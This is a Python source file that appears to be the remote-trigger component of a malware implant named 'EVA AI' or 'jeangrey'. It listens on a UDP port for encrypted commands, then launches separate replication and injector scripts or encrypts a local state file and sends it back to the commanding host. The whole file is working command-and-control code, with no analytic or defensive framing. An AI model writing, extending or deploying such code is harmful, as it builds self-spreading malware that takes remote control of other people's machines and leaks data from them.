import socket
import json
import subprocess
from jeangrey_crypto import decrypt, encrypt
import time

PORT = 5556
RESPONSE_PORT = 5557

def execute_action(action, sender_ip):
    print(f"[TRIGGER] Action: {action}")
    if action == "scan":
        subprocess.run(["python3", "jeangrey_replication.py"])
    elif action == "drop":
        subprocess.run(["python3", "jeangrey_injector.py"])
    elif action == "report":
        try:
            with open("jeangrey_state.json", "r") as f:
                state = f.read()
            encrypted = encrypt(f"report:{state}")
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(encrypted.encode(), (sender_ip, RESPONSE_PORT))
        except:
            pass
    elif action == "shutdown":
        print("[*] Shutting down EVA AI")
        exit()

def listen_and_trigger():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", PORT))
    print("[*] EVA AI Trigger listening...")
    while True:
        data, addr = sock.recvfrom(2048)
        try:
            cmd = decrypt(data.decode())
            execute_action(cmd.strip().lower(), addr[0])
        except Exception as e:
            print(f"[!] Failed to decrypt or process: {e}")

if __name__ == "__main__":
    listen_and_trigger()
